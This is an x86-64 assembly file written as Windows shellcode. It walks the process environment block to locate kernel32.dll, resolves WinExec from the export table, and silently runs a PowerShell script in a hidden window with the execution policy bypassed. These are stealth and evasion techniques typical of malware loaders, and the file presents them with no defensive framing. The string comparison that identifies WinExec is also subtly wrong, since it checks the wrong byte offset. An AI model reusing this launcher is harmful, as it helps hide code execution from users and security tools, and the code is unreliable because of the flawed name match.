
.global mainCRTStartup
.section .text
mainCRTStartup:
    subq $0x28, %rsp

    # GS:[0x60] -> PEB
    movq %gs:0x60, %rax
    # PEB->Ldr (offset 0x18)
    movq 0x18(%rax), %rax
    # Ldr->InMemoryOrderModuleList.Flink (offset 0x20)
    movq 0x20(%rax), %rsi
    # First entry: the exe itself. Flink gives second entry: ntdll.dll
    lodsq
    # Flink of ntdll gives third entry: kernel32.dll
    movq (%rax), %rax
    # DllBase of kernel32.dll is at offset 0x20
    movq 0x20(%rax), %rbp

    # e_lfanew at 0x3c
    movl 0x3c(%rbp), %eax
    addq %rbp, %rax

    # OptionalHeader.DataDirectory[0].VirtualAddress (Export Directory RVA is at offset 0x88)
    movl 0x88(%rax), %edx
    addq %rbp, %rdx

    movl 0x20(%rdx), %ecx
    addq %rbp, %rcx

    movl 0x24(%rdx), %r8d
    addq %rbp, %r8

    movl 0x1c(%rdx), %r9d
    addq %rbp, %r9

    xorq %r10, %r10

find_loop:
    movl (%rcx,%r10,4), %esi
    addq %rbp, %rsi

    # Compare first 4 bytes with WinE (0x456e6957)
    movl (%rsi), %eax
    cmpl $0x456e6957, %eax
    jne next_name
    # Compare next 3 bytes with xec (0x00636578)
    movl 3(%rsi), %eax
    andl $0x00ffffff, %eax
    cmpl $0x00636578, %eax
    je found_winexec

next_name:
    incq %r10
    jmp find_loop

found_winexec:
    movzwq (%r8,%r10,2), %rax
    movl (%r9,%rax,4), %eax
    addq %rbp, %rax

    # Call WinExec(cmd, SW_HIDE = 0)
    leaq cmd(%rip), %rcx
    xorl %edx, %edx
    call *%rax

    xorl %eax, %eax
    addq $0x28, %rsp
    ret

cmd:
    .asciz "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File .\\launch.ps1"
